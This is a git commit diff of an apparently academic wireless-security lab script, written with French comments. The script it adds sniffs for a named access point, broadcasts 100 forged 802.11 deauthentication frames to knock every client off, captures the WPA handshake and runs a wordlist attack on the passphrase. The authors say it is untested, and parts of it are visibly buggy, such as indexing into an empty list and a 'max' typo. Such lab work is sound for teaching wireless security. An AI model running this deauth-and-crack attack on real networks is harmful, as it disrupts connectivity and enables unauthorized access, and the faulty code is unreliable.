eca314fdc863eb50c13b47e8fc9c3a354433eaab
llievre <loic.lievre@heig-vd.ch>
2021-04-15 20:42:18 +0200

    final

--- files/scairodump.py
+++ files/scairodump.py
@@ -1,44 +1,91 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-"""
-Utilise une liste de mots pour comparer les MIC et trouver la bonne passephrase
-
-
-Remarque : Les variables ne sont pas mises dans le fichier custom pour cause de clareté
-           et il nous semble évident qu'un des script peut évoluer et avoir besoin
-           de définir des variables avec du contenu différent. Par conséquent il y a une petite 
-           redondance entre eux en terme de contenu. (Par exemple en utilisant une autre trame)
-           Cela nous permet d'avoir deux fichiers indépendants.
-"""
-
-__author__      = "Abraham Rubinstein et Yann Lederrey | modified By Schranz Guillaume et Lièvre Loïc"
-__copyright__   = "Copyright 2021, HEIG-VD"
-__license__ 	= "GPL"
-__version__ 	= "1.0"
-__email__ 		= "abraham.rubinstein@heig-vd.ch"
-__status__ 		= "Prototype"
-
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
 from pbkdf2 import *
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
-import custom 
+import custom
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("wpa_handshake.cap") 
+"""
+    Nous ne parvenons pas à voir nos réseau wifi mais ceux des voisins seulement...
+    
+    Par conséquent nous ne pouvons pas tester ce script efficacement et la partie
+    de récupération des handshake ne sera pas complète.
+"""
+
+DESIRED_SSID = "SWI"
+SSID = ""
+BSSID = ""
+
+def statusAP(pkt):
+    global SSID
+    global BSSID
+    if pkt.haslayer(Dot11):
+
+        if pkt.type == 0 and pkt.subtype == 8:
+            currentSSID = str(pkt.info)
+            if currentSSID==DESIRED_SSID:
+                SSID = currentSSID
+                BSSID = str(pkt.addr3)
+                print(SSID + " / " + BSSID)
+        else: pass
+    else: pass
+
+#on cherche la mac address de l'AP
+print("Recherche de l'AP "+ DESIRED_SSID)
+sniff(iface="wlp61s0mon",prn=statusAP)
+
+#on veut déconnecter tout le monde
+target = "FF:FF:FF:FF:FF:FF" #periph a attaquer
+
+#on forge un packet de deauth
+dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=BSSID, addr3=BSSID)
+packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+
+#on envoie les paquets de deauth
+print("Envois des paquets de deauth...")
+sendp(packet, inter=0.1, count=100, iface="wlp61s0mon", verbose=1)
+print("Packets deauth envoyés")
+
+#On sniffe pour récuprer les EAPOL
+print("Sniffing en cours, appuyez sur CTRL+C pour arrêter")
+#thx to : https://stackoverflow.com/questions/9210879/scapy-filtering-with-sniff-function
+packets = sniff(filter="ether proto 0x888e", iface="wlp61s0mon", count=100)
+
+wpa = []
+#on recupere les paquets
+#CETTE PARTIE N'A PAS PU ETRE TESTEE
+first = True
+attackMac = ""
+count = 0
+
+#Nous recherchons les 4 packets de la meme victime
+#Vu que c'est un broadcast, il faut prendre les handshake 
+#de la meme victime
+for p in packets:
+    mac = p.addr1.replace(':', '') #on regarde la mac
+    if first:
+        #on sauvegarde les données du hadnshake 1
+        wpa[count]=p
+        attackMac = max
+        count += 1
+    elif mac == attackMac:
+        #on trouve les handshake 2,3,4
+        wpa[count] = p #handshake N
+        count += 1
+
+    #on sort si on a nos 4 paquets
+    if count == 4:
+        break
 
 #get packets from list
-packetBroadcast = wpa[0] #beacon to find ssid
-packetHS1 = wpa[5] #handshake 1
-packetHS2 = wpa[6] #handshake 2
-packetHS4 = wpa[8] #handshake 4
+packetHS1 = wpa[0] #handshake 1
+packetHS2 = wpa[1] #handshake 2
+packetHS4 = wpa[2] #handshake 4
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-ssid        = packetBroadcast.info.decode()
+ssid        = SSID
 APmac       = a2b_hex(packetHS1.addr2.replace(":", "")) #on recupere la mac de l'ap dans le handshake 1
 Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du client dans le handshake 1
 
@@ -58,16 +105,14 @@ data        = a2b_hex(Dot11Elt(packetHS4).load[48:].hex().replace(mic_to_test, "
 
 ssid = str.encode(ssid)
 
-#on ouvre le fichier de mots
 fileWords = open("wordslist.txt", "r")
 
-#on teste chaque mot du fichier
 for word in fileWords.readlines():
     cleanWord = word.strip()#on nettoie le mot sinon \n fais encore partie du mot
 
     #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     passPhrase = str.encode(cleanWord) 
-
+    
     pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
 
     #expand pmk to obtain PTK
